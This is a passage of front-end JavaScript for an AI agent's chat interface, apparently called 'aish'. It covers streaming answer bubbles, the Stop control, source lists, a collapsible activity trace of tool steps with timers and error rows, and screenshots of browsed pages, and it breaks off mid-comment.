function fenceCloses(line, fence) {
  const m = line.match(FENCE_RE);
  return Boolean(m) && m[3] === "" && m[2][0] === fence.ch && m[2].length >= fence.len;
}
// A fenced block's content loses the opening fence's own indentation (up to
// that many spaces) — otherwise a nested fence indents every code line.
function dedent(line, n) {
  let k = 0;
  while (k < n && line[k] === " ") k++;
  return line.slice(k);
}

// Offset where the stable prefix ends: just past the last blank line that is
// outside a code fence and already followed by another line (a trailing
// blank may still grow into a paragraph continuation). Blocks never span a
// blank line except fenced code, so splitting here renders identically to a
// full parse.
function stableBoundary(text) {
  const lines = text.split("\n");
  let boundary = 0;
  let pos = 0;
  let fence = null;
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if (fence) {
      if (fenceCloses(line, fence)) fence = null;
    } else {
      const open = fenceOpen(line);
      if (open) fence = open;
      else if (line.trim() === "" && i < lines.length - 1) {
        boundary = pos + line.length + 1;
      }
    }
    pos += line.length + 1;
  }
  return boundary;
}

// [ANSWER-CLOSE-START]
// The orderly end of a bubble: flush, decorate, release. resetLiveTurn is the
// DISORDERLY one (the transcript is being replaced under it) — between them they
// are the only writers of answerEl besides the token path that opens it.
//
// `interim` closes a NARRATION delivery (#212) instead of an answer. The tool
// row is the deliverable's row — copy, export, fork, regenerate, 👍/👎 — and
// every one of those names the turn's ANSWER: the fork names the record the
// turn promoted to its answer ([FORK-ANCHOR]), regenerate re-runs the prompt,
// and a rating must bind to the turn rather than fragment across however many
// times the model spoke on the way there. So an interim bubble gets no row at
// all; it is marked instead, and reads as progress.
// `answerId` names the record this bubble came from (#229) and is known only to
// `done` — a bubble closed by anything else (the next user turn, a rebuild) is
// one whose turn never reported an id, and its Fork falls back to the ordinal.
function closeAnswer(interim, answerId) {
  // A finished answer (streaming ends, or something else interrupts the
  // block) gets its copy/read-aloud row; mid-stream re-renders would clobber it.
  if (answerEl) {
    renderAnswerNow(); // flush any tokens still waiting on the next frame
    highlightFences(answerEl); // the answer is settled now — safe to tokenize fences once
    if (interim) answerEl.classList.add("interim");
    else if (answerText.trim()) {
      attachAnswerTools(answerEl, answerText, lastUserPrompt, answerId);
    }
  }
  answerEl = null;
  answerText = "";
}
// [ANSWER-CLOSE-END]

// [DELIVERY-START]
// One thing said on the way to the answer (#212) is over: close its bubble so
// the next thing said gets its own, instead of a whole task arriving as one
// paragraph that grew for four minutes.
//
// The text rides the event for the same reason `done` carries `result`: the
// tokens may never have arrived. A bound turn cannot stream them at all (Verify
// buffers every token, and whether a turn is the ANSWER is only knowable once
// its tool calls arrive), and a mid-stream replay drops the stale live tail —
// in both cases `sawAnswer` is false and this is the only copy there is.
function onDelivery(event) {
  if (!sawAnswer && event.text) {
    // Complete and authoritative, so it paints even over an abandoned turn —
    // unlike a lone live token, which would be a truncated fragment. Clearing
    // the flag first is what lets it through onToken's own drop guard.
    answerAbandoned = false;
    onToken(event.text);
  }
  closeAnswer(true); // flushes whatever is still queued for the next frame
  // The turn goes on: the next delivery, and the answer itself, are fresh
  // bubbles. Both flags describe the bubble just closed, not the turn.
  sawAnswer = false;
  answerAbandoned = false;
}
// [DELIVERY-END]

function onDone(event) {
  // How long THIS answer took, for the readout under it — a wall-clock measure,
  // so it is meaningful only for a turn we watched run. A replayed turn now
  // carries a real origin (it is what the live clock counts from), and the time
  // since then is the age of the transcript, not the length of the turn.
  answerTiming = !replaying && turnStart ? (Date.now() - turnStart) / 1000 : 0;
  if (!sawAnswer && event.result) {
    const el = addMsg("answer md", "");
    el.replaceChildren(renderMarkdown(event.result));
    highlightFences(el);
    attachAnswerTools(el, event.result, lastUserPrompt, event.answer);
  }
  closeAnswer(false, event.answer);
  answerAbandoned = false; // this turn is over; the next one streams normally
  maybeSpeakReply(); // voice-in → voice-out: auto-read a reply to a dictated message (#97)
  finishTrace();
  turnStart = 0; // no turn is running; the next card must not inherit this clock
  if (event.sources && event.sources.length) addSources(event.sources);
  setBusy(false);
  setStatus(null);
  // Settle the view on the response start (the collapsed trace is now smaller);
  // never on the bottom of a long answer.
  if (!replaying) requestAnimationFrame(() => anchorAnswer(true));
  notify("aish — answer ready", event.result);
}

// The server had nothing running for this session when Stop was pressed (#48).
// The foreground may be wedged showing "working" (e.g. a terminal event that
// never landed) — reconcile it to idle quietly: collapse any live trace and
// clear busy WITHOUT the red "task failed" box, red dot, or notification a
// real `error` carries. Stop thus always succeeds instead of dead-ending.
function onStopped() {
  closeAnswer();
  finishTrace();
  turnStart = 0;
  setBusy(false);
  setStatus(null);
}

function addSources(sources) {
  const details = document.createElement("details");
  details.className = "sources";
  const summary = document.createElement("summary");
  summary.textContent = `Sources (${sources.length})`;
  details.appendChild(summary);
  for (const source of sources) {
    const row = externalAnchor(source.url);
    row.className = "source-row";
    const name = document.createElement("span");
    name.className = "source-name";
    let host = source.url;
    try { host = new URL(source.url).hostname; } catch { /* keep full url */ }
    name.textContent = source.title || host;
    const url = document.createElement("span");
    url.className = "source-url";
    url.textContent = source.url;
    row.append(name, url);
    details.appendChild(row);
  }
  messagesEl.appendChild(details);
  scrollToEnd();
}

function onStatus(event) {
  if (event.state === "idle") { setStatus(null); return; }
  // A streaming thinking gist (unrecorded, live-only): stash it on the trace
  // so the header can say "Thinking: <gist>" while the model reasons.
  if (event.note && currentTrace) {
    currentTrace.liveGist = event.note;
    updateTraceHead(currentTrace);
  }
  let text = `${event.label || "working"}…`;
  if (event.tokens) text += ` · ↓ ${event.tokens >= 1000 ? (event.tokens / 1000).toFixed(1) + "k" : event.tokens} tokens`;
  setStatus(text);
}

let clientBusy = false;
let pendingCards = 0;
let statusText = "";

function setStatus(text) {
  statusText = text || "";
  refreshStatusline();
}

// Header status dot (#61): red when the socket is down or the last turn
// errored (can't reach/use the model), green + glow while working, green +
// static when connected and idle.
let connOk = false;
let taskErrored = false;
function updateDot() {
  const dot = document.querySelector(".model-dot");
  if (!dot) return;
  const bad = !connOk || taskErrored;
  dot.classList.toggle("bad", bad);
  dot.classList.toggle("working", !bad && clientBusy);
}

function setBusy(busy) {
  clientBusy = busy;
  updateDot();
  refreshStatusline();
}

function refreshStatusline() {
  // Visible whenever the session is working — including parked on an
  // approval card — so Stop is always reachable while something runs. A live
  // activity trace has its own header Stop + status, so suppress the bottom
  // bar then to avoid a duplicate "thinking…" line below the timeline (#10).
  const traceLive = currentTrace && currentTrace.el.classList.contains("live");
  const visible = (clientBusy || Boolean(statusText)) && !traceLive;
  $("statusline").hidden = !visible;
  $("status-text").textContent =
    statusText || (pendingCards > 0 ? "waiting for approval" : "working…");
  $("stop-btn").hidden = !clientBusy;
  // While an approval is pending the model is blocked — no progress is
  // streaming — so let the sticky live-trace yield (CSS) rather than pinning at
  // the top where the approval card would scroll underneath it.
  document.body.classList.toggle("awaiting-approval", pendingCards > 0);
}

$("stop-btn").onclick = () => act({ type: "stop" }, { label: "the stop" });

// ---- activity trace ------------------------------------------------------
// One collapsible group per task, built from structured `step` events. Live
// while the task runs (spinner, streaming output into the running step),
// collapsed to a one-line summary when it finishes. Replays deterministically
// because the steps are recorded events like everything else.
let currentTrace = null;

const TRACE_ICONS = {
  thinking: (c) => `<path d="M9 4.5A4 4 0 0 0 5.5 10 3.5 3.5 0 0 0 6 16.5 3.5 3.5 0 0 0 12 18a3.5 3.5 0 0 0 6-1.5A3.5 3.5 0 0 0 18.5 10 4 4 0 0 0 15 4.5a3 3 0 0 0-6 0z" fill="none" stroke="${c}" stroke-width="1.5"/><path d="M12 5v13" stroke="${c}" stroke-width="1.5"/>`,
  knowledge: (c) => `<path d="M12 3.5 14 8.6l5.5.4-4.2 3.6 1.3 5.4L12 15.4 7.4 18l1.3-5.4L4.5 9l5.5-.4z" fill="${c}" stroke="${c}" stroke-width="1" stroke-linejoin="round"/>`,
  web: (c) => `<circle cx="11" cy="11" r="6.5" fill="none" stroke="${c}" stroke-width="1.7"/><path d="M16 16l4 4" stroke="${c}" stroke-width="1.7" stroke-linecap="round"/>`,
  command: (c) => `<path d="M4 17.5V6.5a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2z" fill="none" stroke="${c}" stroke-width="1.6"/><path d="M7.5 9l3 3-3 3M13 15h4" stroke="${c}" stroke-width="1.6" fill="none" stroke-linecap="round" stroke-linejoin="round"/>`,
  denied: (c) => `<path d="M4 17.5V6.5a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2z" fill="none" stroke="${c}" stroke-width="1.6"/><path d="M8.5 8.5l7 7M15.5 8.5l-7 7" stroke="${c}" stroke-width="1.6" stroke-linecap="round"/>`,
  doc: (c) => `<path d="M7 3.5h6.5L18 8v11a1.5 1.5 0 0 1-1.5 1.5h-9A1.5 1.5 0 0 1 6 19V5A1.5 1.5 0 0 1 7 3.5z" fill="none" stroke="${c}" stroke-width="1.6"/><path d="M13 3.5V8h4.5" fill="none" stroke="${c}" stroke-width="1.6"/>`,
  write: (c) => `<path d="M12 19.5h8" stroke="${c}" stroke-width="1.8" stroke-linecap="round"/><path d="M15.5 5.2a1.7 1.7 0 0 1 2.4 2.4l-8.3 8.3-3.2.8.8-3.2z" fill="none" stroke="${c}" stroke-width="1.7" stroke-linejoin="round"/>`,
  check: (c) => `<path d="M5 12.5l4 4 10-10.5" fill="none" stroke="${c}" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round"/>`,
  chat: (c) => `<path d="M4.5 6.5a2 2 0 0 1 2-2h11a2 2 0 0 1 2 2v7a2 2 0 0 1-2 2H10l-4 3.5V15.5H6.5a2 2 0 0 1-2-2z" fill="none" stroke="${c}" stroke-width="1.6" stroke-linejoin="round"/>`,
  folder: (c) => `<path d="M3.5 6.8a2 2 0 0 1 2-2h3.4l2 2.2h7.6a2 2 0 0 1 2 2v8.2a2 2 0 0 1-2 2h-13a2 2 0 0 1-2-2z" fill="none" stroke="${c}" stroke-width="1.6"/>`,
  dot: (c) => `<circle cx="12" cy="12" r="3.5" fill="${c}"/>`,
};

function traceSvg(name, color) {
  const build = TRACE_ICONS[name] || TRACE_ICONS.dot;
  return `<svg viewBox="0 0 24 24" width="15" height="15">${build(color)}</svg>`;
}

const SPINNER = '<span class="spin"></span>';

// tool name → (friendly title, icon key, accent css var)
const TOOL_META = {
  run_command: ["run_command", "command", "--green"],
  web_search: ["Searched the web", "web", "--blue"],
  read_url: ["Read a page", "web", "--blue"],
  show_image: ["Fetched a picture", "web", "--blue"],
  recall: ["Recalled from memory", "knowledge", "--yellow"],
  read_docs: ["Read docs", "doc", "--dim"],
  read_file: ["read_file", "doc", "--dim"],
  read_skill: ["Read a skill", "knowledge", "--green"],
  write_file: ["write_file", "write", "--green"],
  edit_file: ["edit_file", "write", "--green"],
  remember: ["Saved to memory", "knowledge", "--yellow"],
  forget_memory: ["Forgot a memory", "knowledge", "--yellow"],
  create_rule: ["Wrote a rule", "knowledge", "--orange"],
  edit_rule: ["Changed a rule", "knowledge", "--orange"],
  retire_rule: ["Retired a rule", "knowledge", "--orange"],
};

// [TRACE-TAIL-START]
// The live trace is the TAIL of the turn: your prompt, then what the model
// wrote, then what it is doing right now. That ordering can't be chosen once at
// creation — the card exists BEFORE the answer bubble does (steps arrive first),
// and every later append (answer bubbles, terminal blocks, echoes, approval
// cards) lands after it. So the position is re-established instead: scrollToEnd
// is the funnel every content-adding path already calls, which is why the move
// lives there — one enforcement point covers appends not yet written.
function keepTraceLast() {
  const el = currentTrace && currentTrace.el;
  if (!el || !el.classList.contains("live")) return;
  if (el.parentNode === messagesEl && messagesEl.lastElementChild !== el) {
    messagesEl.appendChild(el);
    pinTrace(currentTrace); // a re-inserted node can lose the pane's scroll offset
  }
}

// The pinned card overlaps the floating jump-to-latest arrow (both live just
// above the composer), so the arrow is offset by the card's measured height.
// Its height is not a constant — the status line wraps up to three lines, and
// expanding the timeline changes it outright — hence an observer rather than a
// magic number. Guarded: the choreo sandboxes have no ResizeObserver, and the
// arrow's placement is cosmetic, so absent one it simply keeps its base offset.
function measurePinnedTrace(t) {
  const set = () => document.body.style.setProperty("--live-trace-h", `${t.el.offsetHeight}px`);
  set();
  if (typeof ResizeObserver !== "function") return;
  t.sizer = new ResizeObserver(set);
  t.sizer.observe(t.el);
}

function releasePinnedTrace(t) {
  if (t.sizer) { t.sizer.disconnect(); t.sizer = null; }
  document.body.style.removeProperty("--live-trace-h");
}
// [TRACE-TAIL-END]

// [TRACE-OPEN-START]
// The live trace comes into being HERE and nowhere else — one per turn, created
// lazily by the first step that needs it. Its disposal is [TRACE-CLOSE]'s; a
// third writer is how a trace from one chat ended up collecting another's steps.
function ensureTrace() {
  if (currentTrace) return currentTrace;
  const el = document.createElement("div");
  // Collapsed while running: the header IS the status line, and the card sits at
  // the tail of the transcript pinned above the composer — a tall timeline there
  // would eat the answer's reading space. Tap the header for the steps.
  el.className = "trace live";
  const head = document.createElement("button");
  head.type = "button";
  head.className = "trace-head";
  // Order matters: the chevron follows the TEXT it discloses, and Stop owns the
  // trailing edge on its own. Two affordances at the same edge made the expand
  // tap land on Stop.
  head.innerHTML =
    `<span class="trace-status">${SPINNER}</span>` +
    `<span class="trace-headtext"><span class="trace-title">Working…</span>` +
    `<span class="trace-sub"></span></span>` +
    `<svg class="trace-chev" viewBox="0 0 24 24"><path d="M6 9.5l6 6 6-6" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>` +
    `<button type="button" class="trace-stop" aria-label="stop" title="Stop"><svg viewBox="0 0 24 24"><rect x="6" y="6" width="12" height="12" rx="2.5" fill="currentColor"/></svg></button>`;
  const body = document.createElement("div");
  body.className = "trace-body";
  // Steps live in an inner content div so the timeline rail spans the FULL
  // (scrollable) content, not just the visible slice.
  body.innerHTML = '<div class="trace-inner"><div class="trace-rail"></div></div>';
  el.append(head, body);
  const t = {
    el, head, body, inner: body.querySelector(".trace-inner"),
    started: 0, secs: 0, tokensIn: 0, tokensOut: 0,
    pending: null, thinkingRow: null,
    // The live header counts the TURN, not this card: the card is created by the
    // turn's first step, which on a slow local model lands minutes after you hit
    // send. `turnStart` is that turn's origin (0 when no live turn is running, so
    // a replayed or stray step can't inherit a finished turn's clock); a replay
    // rebuilding a running turn arrives with no origin at all and back-dates this
    // from the steps it replays — see accountStepTime.
    startedAt: turnStart || Date.now(),
    // Whether that origin is the turn's real start or a guess starting now. A
    // replay reconstructs the guess from the steps; a known origin must not be
    // back-dated on top of that (it is already correct, and the sum would push
    // it into the past twice).
    originKnown: !!turnStart,
    timer: null,
    // Which TURN this card belongs to (#243). Stamped at creation from the id
    // #202 already mints, so the "Full record" row addresses the turn by id
    // rather than by a position the browser would have to count — and it binds
    // the card to the turn that made it, not to whatever is current when it
    // finishes.
    turnId: currentTurnId || "",
    autoCollapsed: false, // collapsed by an approval card, to be restored after
    // Live-status DATA for the header line — strings are derived only in
    // traceStatusLine (the choreo tests run these handlers with the header
    // renderer stubbed out, so handlers must never build display text).
    turnSay: null,       // model preamble alongside this turn's tool calls
    turnGist: null,      // first line of the turn's thinking text
    liveGist: null,      // streaming thinking gist (status channel, unrecorded)
    running: [],         // in-flight tool_starts: {name, summary, command}
    // Rows of actions HELD for adjustment, by their `call` id, so a later step
    // carrying `replaces` can point back at the one it followed (#323). Per
    // card because `call` numbers restart with the turn — the same reason the
    // agent's own hold register is per-turn. Written by toolFinish only.
    heldRows: new Map(),
    waitingApproval: false, answering: false, stopping: false,
    userToggled: false,  // the reader took over the open/closed state
  };
  // The head toggles expand freely — even while the turn runs (#65). A manual
  // toggle is the user's choice, so clear any pending auto-restore so the
  // approval-resolved handler won't fight them by re-expanding.
  head.onclick = (e) => {
    if (e.target.closest(".trace-stop")) return;
    el.classList.toggle("open");
    t.autoCollapsed = false;
    t.userToggled = true;
  };
  head.querySelector(".trace-stop").onclick = (e) => {
    e.stopPropagation();
    // "Stopping…" says the task is coming down. Unreceipted it runs on behind
    // a header that has given up asking, with the control disabled — so the
    // claim is withdrawn and Stop becomes pressable again ([ACK-LEDGER]).
    const t = currentTrace;
    act({ type: "stop" }, { label: "the stop", lost: () => unmarkStopping(t) });
    markStopping(t); // immediate "Stopping…" feedback in the header
  };
  messagesEl.appendChild(el);
  // Deliberately NOT the scroll anchor: the anchor is what gets pinned to the
  // top of the screen, and the card now lives at the BOTTOM of the turn. The
  // answer claims it instead ([ANSWER-OPEN]).
  currentTrace = t;
  body.addEventListener("scroll", () => updateScrollHints(body));
  currentTrace.timer = setInterval(() => updateTraceHead(currentTrace), 1000);
  refreshStatusline(); // the trace header owns Stop now; hide the bottom bar
  measurePinnedTrace(t);
  scrollToEnd();
  return currentTrace;
}
// [TRACE-OPEN-END]

// The Stop button was pressed: reflect it in the header until `done` lands.
// State, not a one-shot DOM write — the 1s ticker used to repaint "Working…"
// right over the old direct title write.
function markStopping(t) {
  if (!t) return;
  t.stopping = true;
  t.el.classList.add("stopping");
  const btn = t.el.querySelector(".trace-stop");
  if (btn) btn.disabled = true;
  updateTraceHead(t);
}

// Withdraw that claim: the stop never reached the server, so the task is still
// running and the control that asks for it must work again ([ACK-LEDGER]).
function unmarkStopping(t) {
  if (!t) return;
  t.stopping = false;
  t.el.classList.remove("stopping");
  const btn = t.el.querySelector(".trace-stop");
  if (btn) btn.disabled = false;
  updateTraceHead(t);
}

// Fade the top/bottom edge of a scroll box when there's more content there.
function updateScrollHints(box) {
  box.classList.toggle("more-above", box.scrollTop > 4);
  box.classList.toggle("more-below", box.scrollTop + box.clientHeight < box.scrollHeight - 4);
}

// Keep the newest step visible inside the height-capped live steps pane.
function pinTrace(t) {
  if (t.el.classList.contains("live")) {
    requestAnimationFrame(() => {
      t.body.scrollTop = t.body.scrollHeight;
      updateScrollHints(t.body);
    });
  }
}

// A live "how long has THIS step run" timer on the active row.
function startStepTimer(t, ref) {
  const timer = document.createElement("span");
  timer.className = "step-timer";
  timer.textContent = "0s";
  ref.titleEl.appendChild(timer);
  t.activeStartedAt = Date.now();
}
function clearStepTimer(t, ref) {
  const el = ref.titleEl.querySelector(".step-timer");
  if (el) el.remove();
  t.activeStartedAt = null;
}

function traceRow(t, iconHtml, title, sub) {
  const row = document.createElement("div");
  row.className = "step";
  const badge = document.createElement("span");
  badge.className = "step-badge";
  badge.innerHTML = iconHtml;
  const main = document.createElement("div");
  main.className = "step-main";
  const titleEl = document.createElement("span");
  titleEl.className = "step-title";
  titleEl.append(title); // string or node
  main.appendChild(titleEl);
  if (sub) {
    const subEl = document.createElement("span");
    subEl.className = "step-sub";
    subEl.textContent = sub;
    main.appendChild(subEl);
  }
  row.append(badge, main);
  t.inner.appendChild(row);
  scrollToEnd();
  pinTrace(t);
  return { row, badge, main, titleEl };
}

// One step's duration, booked against the turn's two clocks: `secs` is the work
// the finished header reports, `startedAt` the wall-clock origin the live header
// counts from.
//
// The back-date is what makes a mid-turn REPLAY continue the clock instead of
// restarting it. A replay rebuilds the running turn's steps out of the log (every
// reconnect — each phone unlock — does this), and the log carries no origin for
// the turn: the replayed `user` event deliberately sets none, so the rebuilt card
// would count from the reconnect and read 0:03 on a turn ten minutes old. Each
// replayed step therefore pushes the origin back by its own duration,
// reconstructing where the turn actually began. Live steps never back-date —
// `startedAt` is already the real turn start, and parallel read-only tools would
// otherwise book their overlap twice.
function accountStepTime(t, secs) {
  if (!secs) return;
  t.secs += secs;
  if (replaying && !t.originKnown) t.startedAt -= secs * 1000;
}

// The turn's real start, off a REPLAYED `user` event (epoch seconds, stamped by
// the server when the turn began).
//
// This is the origin the live clock needs and the step-sum back-date above can
// only approximate: summing steps measures the WORK, and a turn is work plus
// everything between it — the step still in flight, an approval sitting unanswered,
// the answer streaming out — so the reconstruction always came back SHORT. That is
// why swiping to another chat and back wound the clock backwards by a minute
// instead of to zero: it was never a reset, it was a re-derivation from less.
//
// 0 means "unusable" — a transcript trimmed past the turn's own user event, a log
// written before the stamp existed, or a client clock behind the server's (a start
// in the future would count DOWN) — and that keeps the step-sum as the fallback.
function replayedTurnStart(event) {
  const ms = Number(event.ts) * 1000;
  if (!Number.isFinite(ms) || ms <= 0 || ms > Date.now()) return 0;
  return ms;
}

function traceStep(step) {
  const t = ensureTrace();
  if (step.kind === "thinking_start") {
    // A new model turn: the previous turn's words no longer describe it.
    t.turnSay = t.turnGist = t.liveGist = null;
    t.answering = false;
    // A live, highlighted "Thinking…" row — the active step on the timeline.
    if (!t.thinkingRow) {
      t.started += 1;
      const ref = traceRow(t, '<span class="spin spin-purple"></span>', "Thinking…", "");
      ref.row.classList.add("running", "active-step");
      startStepTimer(t, ref);
      t.thinkingRow = ref;
    }
    updateTraceHead(t);
    return;
  }
  if (step.kind === "thinking_cancel") {
    // A plain answer needs no thinking row — but if the answer already streamed
    // into it (relabeled "Answering…"), keep it as a finalized "Answered" step
    // instead of dropping it.
    // A text-only turn never emits a "thinking" step (that only fires when the
    // turn has tool calls), so this is the only place its token usage AND its
    // duration land. Unbooked, the finished header contradicted its own
    // timeline: a turn that thought for 3.6s, ran one tool for 2.2s and then
    // spent 23s writing the answer summarized itself as "Worked for 5.8s" with
    // an "Answered in 23s" row sitting right below it. Writing the answer is
    // the work the turn is usually mostly made of.
    accountStepTime(t, step.secs);
    if (step.tokens) { t.tokensIn += step.tokens[0] || 0; t.tokensOut += step.tokens[1] || 0; }
    if (t.thinkingRow) {
      if (t.thinkingRow.isAnswer) finalizeAnswerRow(t, t.thinkingRow, step.secs);
      else { t.thinkingRow.row.remove(); t.started -= 1; }
      t.thinkingRow = null;
    }
    updateTraceHead(t);
    return;
  }
  if (step.kind === "thinking") {
    accountStepTime(t, step.secs);
    if (step.tokens) { t.tokensIn += step.tokens[0] || 0; t.tokensOut += step.tokens[1] || 0; }
    // The model's own words for this turn (say = preamble, gist = thinking
    // text) — the header prefers these over the deterministic tool line.
    t.turnSay = step.say || null;
    t.turnGist = step.gist || null;
    t.liveGist = null; // the persisted gist supersedes the streamed one
    // A "thinking" step only fires when the turn ended in tool calls, so any
    // streamed text was preamble narration — not the answer.
    t.answering = false;
    if (t.thinkingRow) { // finalize the live row in place
      const ref = t.thinkingRow;
      clearStepTimer(t, ref);
      ref.row.classList.remove("running", "active-step");
      ref.badge.innerHTML = traceSvg("thinking", "var(--purple)");
      ref.titleEl.textContent = `Thought for ${fmtSecs(step.secs)}`;
      // History bonus: the row keeps the thinking gist as its subtitle —
      // must match the replay branch below or hot/cold rows diverge.
      if (step.gist && !ref.main.querySelector(".step-sub")) {
        const subEl = document.createElement("span");
        subEl.className = "step-sub";
        subEl.textContent = step.gist;
        ref.main.appendChild(subEl);
      }
      t.thinkingRow = null;
    } else {
      t.started += 1;
      traceRow(t, traceSvg("thinking", "var(--purple)"),
        `Thought for ${fmtSecs(step.secs)}`, step.gist || "");
    }
    updateTraceHead(t);
    return;
  }
  if (step.kind === "trim") {
    // The one governance record that draws a row (#243). Every other one
    // describes a decision you can look up; this one CONTRADICTS what is in
    // front of you — the transcript above still shows the whole page while the
    // model was handed 200 characters of it, and the transcript is what you are
    // reading. It marks the turn it prepared; which results, and whether they
    // can be paged back, are in the full record one tap below.
    t.started += 1;
    const n = step.affected || 0;
    const recoverable = (step.stubbed || []).filter((x) => x.continuation).length;
    const tail = recoverable === n && n
      ? "the model can read them back on demand"
      : recoverable
        ? `${recoverable} of them can be read back on demand`
        : "the model cannot get them back";
    traceRow(
      t, traceSvg("thinking", "var(--dim)"),
      `Shortened ${n} earlier result${n === 1 ? "" : "s"} for the model`,
      tail
    );
    return;
  }
  if (step.kind === "knowledge") {
    t.started += 1;
    const items = step.items || [];
    const nSkill = items.filter((i) => i.kind === "skill").length;
    const nMem = items.length - nSkill;
    const parts = [];
    if (nSkill) parts.push(`${nSkill} skill${nSkill === 1 ? "" : "s"}`);
    if (nMem) parts.push(`${nMem} ${nMem === 1 ? "memory" : "memories"}`);
    const { main } = traceRow(
      t, traceSvg("knowledge", "var(--yellow)"), "Recalled knowledge",
      `${parts.join(" · ") || items.length} from past work`
    );
    if (items.length) {
      const chips = document.createElement("div");
      chips.className = "know-chips";
      for (const it of items) {
        const isSkill = it.kind === "skill";
        const chip = document.createElement("span");
        chip.className = "know-chip " + (isSkill ? "skill" : "mem");
        const tag = document.createElement("span");
        tag.className = "know-tag";
        tag.textContent = isSkill ? "SKILL" : "MEM";
        chip.append(tag, document.createTextNode(it.label || ""));
        chips.appendChild(chip);
      }
      main.appendChild(chips);
    }
    updateTraceHead(t);
    return;
  }
  if (step.kind === "injected") {
    // A message the user typed mid-task (issue #95): injected as steering into
    // the running task, not deferred as a separate follow-up. Render a distinct
    // note in the trace and retire its queued chip (a no-op on cold replay,
    // where no chip exists). Emitted identically live and by reconstruct_events.
    t.started += 1;
    traceRow(t, traceSvg("chat", "var(--blue)"), "You added", step.text || "");
    removeQueueChip(step.text);
    updateTraceHead(t);
    return;
  }
  if (step.kind === "model_error") {
    // A failed model call draws a row for the same reason `trim` does: it
    // CONTRADICTS what is in front of you. Before #261 this was a grey echo
    // bubble — live transport only, never written to the session log — so a
    // retried-then-recovered call left the trace showing an unexplained gap,
    // and a cold reload erased even the bubble. Absence as evidence, which is
    // the one thing docs/trace-contract.md §0 exists to prevent.
    t.started += 1;
    const what = String(step.class || "error").replace(/_/g, " ");
    const status = step.status ? ` (${step.status})` : "";
    let tail;
    if (step.action === "retry") {
      const secs = Math.round(step.waited_s || 0);
      tail = secs ? `attempt ${step.attempt} — retrying in ${secs}s`
                  : `attempt ${step.attempt} — retrying`;
    } else if (step.scope === "long") {
      // The distinction the whole record exists for: a spent quota is not a
      // busy one, and telling the two apart is what stops a pointless Retry.
      tail = "this quota is spent, not busy — retrying will not help";
    } else if (step.retryable === false) {
      tail = "retrying cannot change this";
    } else {
      tail = `gave up after ${step.attempt} of ${step.attempts} attempts`;
    }
    traceRow(t, traceSvg("denied", "var(--red)"), `Model call failed — ${what}${status}`, tail);
    updateTraceHead(t);
    return;
  }
  if (step.kind === "tool_start") { toolStart(t, step); return; }
  if (step.kind === "tool") { toolFinish(t, step); return; }
}

// A "SKILL" pill on read_skill rows, mirroring the knowledge-preload chips so
// recalling a specific skill reads consistently with them (vs. memory).
function knowledgeTag(ref, name) {
  if (name !== "read_skill") return;
  const tag = document.createElement("span");
  tag.className = "step-tag know";
  tag.textContent = "SKILL";
  ref.titleEl.appendChild(tag);
}

// [TRACE-FRAME-START]
// Why a browse step has no picture. Four, closed, matching browse.py's
// NO_FRAME_* — a page that never had one and a page whose capture failed are
// different facts, and a row that showed neither would read as neither.
//
// `password` says what was SEEN, never what the page WAS: the check behind it
// is a password box, and an email-first login's first step does not have one.
// The first two are READ-ONLY since #320: nothing emits them any more, and they
// stay here because they are in logs already on disk. A reader that cannot
// render a word an older writer emitted turns a recorded fact into a blank.
const FRAME_ABSENT = {
  password: "no picture — this page was showing a password box",
  unknown: "no picture — the page would not say whether it asks for a password",
  hands: "no picture — you were driving the browser yourself",
  failed: "no picture — the capture did not come back",
};

// What the page LOOKED LIKE when the model read it (#289): the one thing about
// a browsed page nobody could check, because aish drives pages the owner never
// sees. A node for the step's row, or null when the step is about anything else.
//
// The claim is deliberately narrow and is exactly what the capture enforces:
// the picture is of the page at the moment the model was shown it. It is NOT
// "what the model saw" — the model is handed text and a control list, and a
// page can repaint after the shutter.
//
// `frameSrc` and nothing else builds the URL. It used to be `imageSrc`, on the
// reasoning that a frame is a picture in the transcript like any other — and
// #318 is the finding that it is not: a frame is a picture of a page from
// OUTSIDE, and it moved to a store of its own that `/file` does not serve.
function framePicture(path, name) {
  if (!path) return null;
  const src = frameSrc(path);
  if (!src) return null;
  const wrap = document.createElement("div");
  wrap.className = "step-frame";
  const img = document.createElement("img");
  img.loading = "lazy";
  img.alt = name;
  // The bytes are a bounded LRU cache and are purgeable on their own
  // schedule, so a record can outlive what it points at. Never let that read
  // as though nothing was ever captured — but say only what a failed load
  // actually proves: from here an evicted file, a stale token and a server
  // that is not answering are the same event. `aish explain` stats the path
  // and so is the surface that gets to use the word purged.
  img.onerror = () => {
    wrap.textContent =
      "the picture of this page could not be loaded (the store may have cleared it)";
    wrap.className = "step-sub step-frame-gone";
  };
  img.onclick = () => openPreview(src, name, [{ src, name, file: path }], 0);
  img.src = src;
  wrap.appendChild(img);
  return wrap;
}

// What the picture is EVIDENCE OF, under the picture. A frame on its own
// answers "what did this page look like"; the question actually asked of a
// browse step is "what did this press do", and he was left reconstructing the
// second from the first — which is the thing live watching is bad at and a
// reviewable record is meant to fix.
//
// Both facts are carried on the step, never derived here: the writer is the
// only side that held the page before AND the page after, and a renderer
// guessing at a navigation would be a second answer to a question that already
// has one. A step with no recorded address grows no caption at all — a frame
// from a log written before this is still a frame, and "unknown" would be this
// renderer claiming the writer tried.
function frameWhere(step) {
  if (!step.frame_url) return null;
  const cap = document.createElement("div");
  cap.className = "step-sub step-frame-where";
  // Worded to exactly what the writer knows. `frame_from` is the page this
  // chat was LAST SHOWN — which is what the delta is a delta of — so "aish was
  // on X before this" is enforced, while "navigated here from X" would claim
  // no other document sat between the two, which nothing checks.
  cap.textContent = step.frame_from
    ? `${step.frame_url} — aish was on ${step.frame_from} before this`
    : `${step.frame_url} — the address did not change`;
  return cap;
}

// Should this step's recorded console be DRAWN? Recorded always, surfaced on
// anomaly — and "anomaly" means aish's OWN observation that the step did not
// do what it looked like it should, each one a fact the step itself carries:
// the tool failed (`ok: false`), aish said it could not carry the action out
// (`problem`), the action's delta against the page last shown came back empty
// (`unchanged` — the one case where an empty report and a thrown handler are
// one answer), or a click could not land and was never got through
// (`covered` without `dismissed`). Never the page's own noisiness: the number
// of sites that log errors on every healthy page is enormous, and a step
// painted with them reads as a failure nothing observed — the owner's first
